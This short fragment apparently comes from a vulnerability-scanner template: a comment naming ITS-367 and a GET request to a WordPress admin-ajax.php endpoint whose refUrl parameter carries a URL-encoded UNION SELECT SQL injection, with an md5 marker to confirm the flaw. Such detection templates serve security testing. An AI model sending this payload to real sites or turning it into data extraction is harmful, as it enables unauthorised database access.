# Vulnerable: ITS-367
GET /wp-admin/admin-ajax.php?action=refDetails&requests=%7B%22refUrl%22:%22'%20union%20select%201,1,md5({{num}}),4--%20%22%7D
